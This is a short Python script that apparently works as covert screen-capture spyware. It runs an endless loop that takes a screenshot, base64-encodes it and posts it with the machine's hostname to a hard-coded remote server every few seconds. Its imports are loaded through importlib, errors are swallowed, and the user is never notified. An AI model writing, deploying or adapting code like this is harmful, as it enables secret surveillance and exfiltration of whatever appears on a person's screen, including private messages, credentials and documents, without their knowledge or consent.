#         -*- coding:utf-8 -*-        #
#  Copyright (c) 2019 - 2039 XueQian  #
#         version_added:: 1.0.0         #
import importlib

pyautogui = importlib.import_module('pyautogui')
socket = importlib.import_module('socket')
time = importlib.import_module('time')
base64 = importlib.import_module('base64')
requests = importlib.import_module('requests')
sys = importlib.import_module('sys')


name = socket.gethostname()
host = 'http://xueqian.pro:1902'
# host = 'http://192.168.3.10:1902'
if __name__ == '__main__':
    # 下面是真的
    while 1:
        try:
            img = pyautogui.screenshot()
            img.save('screenshot.png')
            pic = base64.b64encode(open('screenshot.png', 'rb').read()).decode()
            a = requests.post(f'{host}/plugins/todesk', json={'com': name, 'pic': pic}).text
        except:
            time.sleep(5)
            continue

        # try:
        if 1:
            if a is None:
                pass
            elif a == 'ok':
                pass
            elif a == 'not in see':
                time.sleep(5)
            else:
                time.sleep(5)
        # except Exception as e:
        #     print(e)
        time.sleep(5)
